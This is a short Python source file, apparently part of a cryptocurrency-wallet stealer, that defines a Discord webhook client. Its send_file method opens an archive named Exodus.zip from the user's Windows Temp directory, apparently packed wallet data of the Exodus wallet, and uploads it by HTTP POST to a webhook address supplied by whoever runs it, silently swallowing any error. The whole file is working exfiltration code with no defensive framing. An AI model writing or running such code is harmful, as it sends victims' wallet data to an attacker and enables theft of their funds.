import httpx
import os.path

client: str = os.path.expanduser("~")

class Discord_Webhook_Client: 
    def __init__(self, webhook: str) -> None:
        self.webhook = webhook
        
    def send_file(self) -> bool:
        """Send files to a discord webhoook.

        Returns:
            bool: If the file could be sent to the webhook or not.
        """
        try:
            exodus_zip = {"file": open(client + "\\AppData\\Local\\Temp\\Exodus.zip", "rb")}
            request = httpx.post(self.webhook, files=exodus_zip)
            
            if request.status_code == 200: 
                return True
            else:
                return False
        except:
            return False